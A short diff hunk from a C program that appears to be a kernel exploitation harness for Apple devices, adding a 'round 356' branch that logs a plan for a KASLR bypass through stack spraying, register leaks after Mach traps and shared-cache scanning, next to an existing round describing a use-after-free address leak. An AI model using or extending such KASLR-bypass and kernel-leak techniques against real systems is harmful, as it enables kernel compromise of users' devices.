@@ -50609,6 +50609,15 @@ new_modes:
             r353_probe();
             goto done;
         }
+        if (rounds == 356) {
+            rlog("*** rounds=356: Targeted KASLR — Stack Spray + Register Leak ***\n");
+            rlog("  r352 found: stack region changed values 0xfffffffefb9e42bb -> 0xfffffffefb9e4263\n");
+            rlog("  Testing: stack spray capture, register leak after Mach traps,\n");
+            rlog("  shared cache KTRR scan for slid addresses, cross-boot correlation.\n\n");
+            fflush(stdout);
+            r353_probe();
+            goto done;
+        }
         if (rounds == 355) {
             rlog("*** rounds=355: KASLR Bypass — AGX Deep Scan + UAF Property Leak ***\n");
             rlog("  r351: 30 candidates, mostly sentinels. 2 real: 0xfffffffffb440e00,\n");
